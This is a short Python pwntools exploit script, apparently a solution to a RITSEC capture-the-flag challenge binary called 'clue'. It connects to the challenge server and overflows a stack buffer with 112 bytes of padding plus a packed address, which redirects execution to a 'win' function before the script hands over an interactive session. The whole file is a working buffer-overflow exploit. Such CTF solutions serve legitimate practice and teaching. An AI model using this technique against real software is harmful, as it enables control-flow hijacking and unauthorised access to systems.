from pwn import *

context.log_level = "debug"

binfile = './clue'
libcfile = ''
offset = b'A'*112

rhost = 'ctf.ritsec.club'
rport = 30839

gdb_script = '''
b main
'''

elf = ELF(binfile)
context.binary = elf

def conn():
    if args.REMOTE:
        p = remote(rhost, rport)
    elif args.GDB:
        p = process(elf.path)
        gdb.attach(p, gdbscript=gdb_script)
    else:
        p = process(elf.path)
    return p

win = 0x0000000000010446

p = conn()
p.recvuntil('Your answer: ')
p.sendline(offset + pack(win))

p.interactive()
